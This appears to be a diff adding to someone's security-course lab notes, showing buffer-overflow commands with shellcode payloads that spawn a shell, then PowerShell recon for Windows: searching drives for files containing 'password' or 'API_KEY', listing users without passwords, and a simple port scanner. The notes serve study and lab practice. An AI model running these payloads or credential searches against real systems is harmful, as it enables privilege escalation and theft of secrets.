@@ -884,3 +884,100 @@ Shell code will be: `6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f
 ./buffer-overflow $(python -c 'print("\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xa8\xe7\xff\xff\xff\x7f")')
 
 ./buffer-overflow $(python -c 'print("\x90" * 60 + "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05" + "\x90" * 30 + "\xa8\xe7\xff\xff\xff\x7f")')
+
+### Day 9 - Complete BOF1
+
+*No notes for today*
+
+### Day 10 - PowerSh***
+
+Search for interesting-file.txt:
+`Get-ChildItem -Path C:\ -Include interesting*.txt -File -Recurse -ErrorAction SilentlyContinue`
+
+Dump contents of that file:
+`type "C:\Program Files\interesting-file.txt.txt"`
+
+Count all cmdlets only:
+`Get-Command -CommandType Cmdlet | Measure-Object`
+
+Get MD5 hash of the file:
+`Get-FileHash "C:\Program Files\interesting-file.txt.txt" -algorithm MD5 | Format-List`
+
+Get current working directory:
+`Get-Location`
+
+Test for a folder to exist:
+`Test-Path C:\Users\Administrator\Documents\Passwords`
+
+Make request to webserver:
+`Invoke-WebRequest -Uri "http://example.com/"`
+
+Base64 decode a file:
+`certutil -decode "C:\Users\Administrator\Desktop\b64.txt" plain.txt`
+
+Get user information for user with SID ...:
+`Get-LocalUser | Select * |  Where-Object { $_.SID -like 'S-1-5-21-1394777289-3961777894-1791813945-501' }`
+
+How many users have their password required values set to False:
+`(Get-LocalUser | Select * |  Where-Object { $_.PasswordRequired -like 'False' }).count`
+
+Get IP address information:
+`Get-NetIPAddress`
+
+Count all listening ports:
+`(Get-NetTCPConnection | Where-Object { $_.State -like "Listen" }).count`
+
+Count installed hotfixes:
+`(Get-HotFix).count`
+
+When was the patch with ID KB4023834 installed:
+`Get-HotFix | Where-Object {$_.HotFixID -like "KB4023834"} | Select "InstalledOn" | Format-List`
+
+Display contents of a backup file:
+`Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue | type`
+
+Search for all files containing "API_KEY":
+`Get-ChildItem -Path C:\ -File -Include *.xml -Recurse -ErrorAction SilentlyContinue | Select-String "API_KEY"` or ``
+
+List all scheduled tasks:
+`Get-ScheduledTask`
+
+List all running processes:
+`Get-Process`
+
+Get owner of C:\ :
+`Get-Item C:\ | Select Fullname,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`
+
+Powershell script to find all files containing "password":
+```
+$Path = "C:\Users\Administrator\Desktop\emails"
+$Text = "password"
+
+# This code snippet gets all the files in $Path that end in ".txt".
+Get-ChildItem $Path -recurse -Filter "*.txt" |
+Where-Object { $_.Attributes -ne "Directory"} |
+ForEach-Object {
+    If (Get-Content $_.FullName | Select-String -Pattern $Text) {
+        $_.FullName
+        echo ---
+        Get-Content $_.FullName | Select-String -Pattern $Text | Select -last 1
+        echo ---
+        echo ""
+    }
+}
+```
+
+Easy portscanner using Powershell:
+```
+$computer=Read-Host "Hostname / IP"
+$start=Read-Host "Start port"
+$stop=Read-Host "Stop port"
+for ($i=[int]$start; $i -le [int]$stop; $i++) { 
+ If (($a=Test-NetConnection $computer -Port $i -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true) {
+        Write-Host $a.Computername $a.RemotePort -ForegroundColor Green -Separator " ==> "
+    }
+ else {
+    Write-Host $a.Computername $a.RemotePort -Separator " ==> " -ForegroundColor Red
+    }
+}
+```
